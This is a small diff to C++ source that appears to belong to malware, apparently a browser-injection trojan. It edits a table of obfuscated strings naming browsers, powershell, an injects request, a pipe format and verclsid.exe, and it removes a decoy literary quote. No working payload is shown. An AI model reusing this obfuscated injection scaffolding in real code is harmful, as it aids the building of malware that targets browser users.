@@ -383,7 +383,7 @@ namespace Strs
    const char *edgeExe;
    const char *braveExe;
    const char *iexploreExe;
-   const char* powershell;
+   const char *powershell;
    const char *injectsRequest;
    const char *chromeName;
    const char *firefoxName;
@@ -789,7 +789,6 @@ void InitApi()
    Strs::infoRequest      = ENC_STR_A"info|%d|%d|%d|%d|%s|%s|%d|%d"END_ENC_STR;
    Strs::pipeName         = ENC_STR_A"\\\\.\\pipe\\%s"END_ENC_STR;  
    Strs::open             = ENC_STR_A"open"END_ENC_STR;
-   Strs::hi               = ENC_STR_A"As we walked along the flatblock marina, I was calm on the outside, but thinking all the time. So now it was to be Georgie the general, saying what we should do and what not to do, and Dim as his mindless greeding bulldog. But suddenly I viddied that thinking was for the gloopy ones and that the oomny ones use, like, inspiration and what Bog sends. For now it was lovely music that came to my aid. There was a window open with the stereo on and I viddied right at once what to do."END_ENC_STR;
    Strs::shell_TrayWnd    = ENC_STR_A"Shell_TrayWnd"END_ENC_STR;
    Strs::verclsidExe      = ENC_STR_A"verclsid.exe"END_ENC_STR;
    Strs::dll32cachePrefix = ENC_STR_A"32"END_ENC_STR;
